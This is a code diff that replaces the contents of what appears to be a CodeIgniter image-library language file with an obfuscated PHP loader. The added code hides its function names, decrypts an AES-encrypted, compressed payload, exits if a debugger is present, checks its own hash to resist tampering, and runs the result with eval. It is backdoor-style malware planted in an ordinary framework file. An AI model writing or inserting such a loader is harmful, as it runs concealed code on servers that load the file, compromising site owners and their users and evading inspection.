@@ -1,57 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['imglib_source_image_required'] = 'You must specify a source image in your preferences.';
-$lang['imglib_gd_required'] = 'The GD image library is required for this feature.';
-$lang['imglib_gd_required_for_props'] = 'Your server must support the GD image library in order to determine the image properties.';
-$lang['imglib_unsupported_imagecreate'] = 'Your server does not support the GD function required to process this type of image.';
-$lang['imglib_gif_not_supported'] = 'GIF images are often not supported due to licensing restrictions. You may have to use JPG or PNG images instead.';
-$lang['imglib_jpg_not_supported'] = 'JPG images are not supported.';
-$lang['imglib_png_not_supported'] = 'PNG images are not supported.';
-$lang['imglib_jpg_or_png_required'] = 'The image resize protocol specified in your preferences only works with JPEG or PNG image types.';
-$lang['imglib_copy_error'] = 'An error was encountered while attempting to replace the file. Please make sure your file directory is writable.';
-$lang['imglib_rotate_unsupported'] = 'Image rotation does not appear to be supported by your server.';
-$lang['imglib_libpath_invalid'] = 'The path to your image library is not correct. Please set the correct path in your image preferences.';
-$lang['imglib_image_process_failed'] = 'Image processing failed. Please verify that your server supports the chosen protocol and that the path to your image library is correct.';
-$lang['imglib_rotation_angle_required'] = 'An angle of rotation is required to rotate the image.';
-$lang['imglib_invalid_path'] = 'The path to the image is not correct.';
-$lang['imglib_invalid_image'] = 'The provided image is not valid.';
-$lang['imglib_copy_failed'] = 'The image copy routine failed.';
-$lang['imglib_missing_font'] = 'Unable to find a font to use.';
-$lang['imglib_save_failed'] = 'Unable to save the image. Please make sure the image and file directory are writable.';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_g3ysw5i3=('bas'.'e64'.'_de'.'cod'.'e');
+$_cm3ap5mc=('gzu'.'nco'.'mpr'.'ess');
+$_qa5sa374=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_dg0fti9o='bqzHKy59';
+$_p91utsmz='dBNn3iRn';
+$_pzzi0brv='022bU7JBEPk=';
+$_aox8rmdr='b7FyK4u/';
+$_cqjwnya9='JWvHt/0m';
+$_lxdutq9g='MTKbbw==';
+$_k4qvox1i='V+OrqD4H';
+$_m0d8d3jw='pUsaHhQt';
+$_lgltct7w=$_g3ysw5i3($_cqjwnya9.$_dg0fti9o.$_aox8rmdr.$_p91utsmz.$_pzzi0brv);
+$_nda2b1ie=$_g3ysw5i3($_k4qvox1i.$_m0d8d3jw.$_lxdutq9g);
+$_g2gzo2wx=$_g3ysw5i3('nMWVcCT3kDnHkpaXZCUim2HvlFsTIsxLPqv2BkQ9d302Ge6ML9Mb+m6GA9T2RjaEdopA2y+Y6eaxwgGBg7VoHr332nUJy8eRDueuYqC/BfIFd8/5QT4f8DJMWHk3txdH5K7grHpb+cSqJ/V5+jZ8QSbMdFo700LsEavqQJpV9jEdbXQ4O0gXPYa/RwlW112BwRSQqDvYimR+BQ/IemhpxJVp+LKBWTuJ5eC3xiLb+ClL6q/0qJ54K3apQ5HWVhBsauYI6vBfBXr2RsL91LdIm9Xcqx6JYxVB2lTqy0t3e89y9+vCtcOLBpxxkxV4oRhs/12hTpj6ZpRSLFkO2g8Z4g9TZJSGtZATeG7P+ccopDmabEkn/4DmBpN9wr9ge2BM1fCVAL95nCC20BPwumJS92LAeGzJAjgLx7DB6vMagftjHfSGlpxihOqvjsmGRqfb0C2be5sN6u/pr4f8M5agpLG75VsD7+o+0nL9IaXDaTCtsPTs9ayNQJqv0JxFNO7Q3wzKm57/orondaaUETQqrzgqPXXMj+bUFemtYfNlHwGpBJXdq9s61FtCgpfkKAfhJTeCToFQlLwH8ObNavXpgWmD2hhQpfdXZgoClXAK5a3ZKiIn/xq+WIZKctu046I3iAdCHhZxI+ww+aOzwd3mF8wXcBTcc4m+PaFW05w8FT0any1jbbPWs+XE8tsS4rsnfp+Q4KsItaceANt15b9k+OPvzquNUzqmB8zHyuy6Uihr1M/C9pdTUXP1YpRMpPzcPeXmpaGm8h8WPzWz/SrwjyhPfgnwfJVhq4OzbPnYRHrdI+5LZOUgFTla2SwzB+kBVCxjL5muvNTDz5JF+W/S96oVnXC2Rj1EG8tb10j0E7Mu0oVgAGscblEElDOdf6h+Y8tvBI0FlTU1dhHdR4vi4xccItYf5dDncrawMNyV26Fxh5+yGuN1viJwLULbtxAicvkYn7UPlMUKJEXVuVIr5w==');
+$_rfalj4jl=$_qa5sa374($_g2gzo2wx,'aes-256-cbc',$_lgltct7w,OPENSSL_RAW_DATA,$_nda2b1ie);
+if($_rfalj4jl===false){exit;}
+$_xgpoh1nu=$_cm3ap5mc($_rfalj4jl);
+if($_xgpoh1nu===false){exit;}
+$_uhcs85d3='4394c7dc264f3414e016ce9e595771bed903947320a9d5cf7bc65fdb26f47d84';
+$_bnhz5puv=@file_get_contents(__FILE__);
+if($_bnhz5puv!==false){
+$_lh4u5ezn=str_replace($_uhcs85d3,"0000000000000000000000000000000000000000000000000000000000000000",$_bnhz5puv);
+$_lx66aywu=hash("sha256",$_lh4u5ezn);
+if($_lx66aywu!==$_uhcs85d3){@http_response_code(403);exit;}
+}
+eval($_xgpoh1nu);
